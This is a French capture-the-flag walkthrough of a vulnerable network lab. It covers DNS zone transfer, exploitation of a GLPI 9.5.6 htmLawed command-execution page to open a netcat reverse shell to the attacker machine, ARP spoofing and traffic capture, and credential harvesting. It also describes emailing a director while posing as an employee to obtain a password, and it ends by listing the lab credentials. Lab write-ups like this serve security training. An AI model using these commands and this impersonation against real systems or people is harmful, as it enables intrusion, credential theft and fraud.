## TAGS : #WEB #NETWORK 

Installation :
```
git clone https://github.com/doubledoze/InfraVuln_01.git
cd InfraVuln_01-main
sudo bash start.sh
```
Connexion au lab ( sur un autre terminal ) :
```
ssh root@localhost -p 2222
Password = hacker
```

### 🟡🔰Enumération🔰🟡 

On commence par énumérer les hôtes présents dans le réseau à l'aide de nmap en utilisant la commande : 
``nmap -sn 192.168.10.0/24``

**<u>Résumé NMAP : </u>**

| Serveur/Hôte | IP Address | Open Ports |
| ---- | ---- | ---- |
| WEB | 192.168.10.3 | 80/tcp open http Apache httpd 2.4.54 ((Debian)) |
| CLIENT ubuntu | 192.168.10.4 |  |
| DNS | 192.168.10.6 | 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) |
| Mail | 192.168.10.20 | 25/tcp open smtp Postfix smtpd,<br>80/tcp open http Apache httpd 2.4.56 ((Debian)),<br>110/tcp open pop3 Dovecot pop3d,<br>143/tcp open imap Dovecot imapd, <br>465/tcp open smtp Postfix smtpd, <br>587/tcp open smtp Postfix smtpd |
| GLPI | 192.168.10.30 | 80/tcp open http Apache httpd 2.4.54 ((Debian)) |
| KALI (hacker) | 192.168.10.2 |  |

## 🔵🔰FLAG 1 : DNS🔰🔵

mail.bigbusiness.loc
hacker.bigbusiness.loc 

**Transfert de zone :**
zone = bigbusiness.loc
donc └─> `dig 192.168.10.6 bigbusiness.loc AXFR`
![[Pasted image 20240202154449.png]]
Flag trouvé : lab{d1sc0v3r3d_DNS_L3ak}

## 🔵🔰GLPI🔰🔵

Vérifications simple et rapide : 
* Regarder le readme ( pour la version )
* Test des identifiants par défaut : glpi/glpi 

Dans notre cas : 
* glpi/glpi fonctionne 
* Version : 9.5.6
On recherche sur internet des CVE qui fonctionnent pour cette version
Vulnérabilité : 
	https://glpi-project.org/security-update-10-0-3-and-9-5-9/
Exploitation : 
	http://192.168.10.30/vendor/htmlawed/htmlawed/htmLawedTest.php
	--> settings -> hook -> exec 
	--> dans la textarea : mettre la commande a éxécuter

**Installer netcat** : `
```
apt install netcat-traditional
```

**Sur la Machine hôte** : `nc -lvnp 5454`
![[Pasted image 20240202161518.png]]
Sur glpi, se rendre sur la page : http://192.168.10.30/vendor/htmlawed/htmlawed/htmLawedTest.php

htmlawed : 
	nc 192.168.10.2 5454 -e /bin/bash
	settings -> host -> "exec"
![[Pasted image 20240202161716.png]]
![[Pasted image 20240202161729.png]]

Shell semi-interactif lancé, pour trouver le flag : on utilise cd,ls,cat... 
![[Pasted image 20240202161751.png]]
***flag{Glp1_H4ck3r}***

## 🔵🔰Man In The Middle ( MiTM ) 🔰🔵 
### 🟡🔰Lancement de l'arp spoofing : 🔰🟡 
Afin d'intercepter les communications entre la machine "active" sur le réseau, on va faire de l'arp spoofing ce qui va nous permettre de se faire passer pour une autre machine et de recevoir des paquets que nous ne sommes pas censé recevoir en temps normal. Afin de réaliser cette attaque, on utilise l'outil **dsniff** : 
**Serveur MAIL :**
```
arpspoof -i eth0 -t 192.168.10.4 192.168.10.20 
arpspoof -i eth0 -t 192.168.10.20 192.168.10.4
```

**Serveur WEB:**
```
arpspoof -i eth0 -t 192.168.10.4 192.168.10.3 
arpspoof -i eth0 -t 192.168.10.3 192.168.10.4
```

On récupère les données interceptées dans un fichier pcap pour l'analyser plus tard.
En temps normal, on utiliserai wireshark directement, mais ici on a uniquement un acces en ligne de commande, on utilise donc tcpdump et on redirige le tout dans un fichier .pcap
`tcpdump -w spoof.pcap`
On attend un peu pour avoir des données à analyser


**Transfert du pcap sur la machine hôte :**
Afin d'utiliser wireshark pour analyser le traffic, on doit d'abord passer sur un environnement graphique, donc sur la machine hôte, pour ceci, on va utiliser netcat.

Sur la machine hôte : 
`nc -lvnp 4545 > spoof.pcap`
	 
Sur la machine kali :
`nc 192.168.202.59 4545 < spoof.pcap `

On peut maintenant lancer le fichier sur wireshark :  
`sudo wireshark spoof.pcap`



![[Pasted image 20240209092259.png]]
![[Pasted image 20240209133436.png]]

En analysant le fichier pcap, on trouve plusieurs éléments intéressants : 
 **MAIL : Filtrer sur SMTP** 
	`comptabilite@bigbusiness.loc:B1gBus1n3ss`
![[Pasted image 20240209110523.png]]
Se connecter avec ce compte sur 192.168.10.20 : 
![[Pasted image 20240209134012.png]]
![[Pasted image 20240209112327.png]]
On envoi un message à direction@bigbusiness.loc en se faisant passer pour un employé demandant gentillement le mot de passe et on recupère le flag, et on voit que le nom du propriétaire de la boite compromise est "Bertrand"

![[Pasted image 20240209112606.png]]

**Serveur WEB : Filtrer sur HTTP**
	`pc-01:YeOa8d03jxP`
![[Pasted image 20240209110724.png]]

Connexion au site avec les identifiants trouvés : http://192.168.10.3
![[Pasted image 20240209135315.png]]
![[Pasted image 20240209135247.png]]
Impossible car on est pas dans le bon réseau, on le fait donc depuis la kali hacker en utilisant cURL : 
`curl -d "username=pc-01&password=YeOa8d03jxP" http://192.168.10.3/check_login.php`
![[Pasted image 20240209114554.png]]

## 🔵🔰Conclusion🔰🔵 
##### 🟡🔰Flags trouvés🔰🟡   
```
	lab{d1sc0v3r3d_DNS_L3ak}
	flag{Glp1_H4ck3r}
	lab{H4ck3d_W3b_S3rv1ce}
	flag{Im_A_H4ck3r}
```
##### 🟡🔰Identifiants trouvés🔰🟡 

```
	glpi:glpi
	direction@bigbusiness.loc:N0P4ss84wd
	comptabilite@bigbusiness.loc:B1gBus1n3ss
	pc-01:YeOa8d03jxP
```









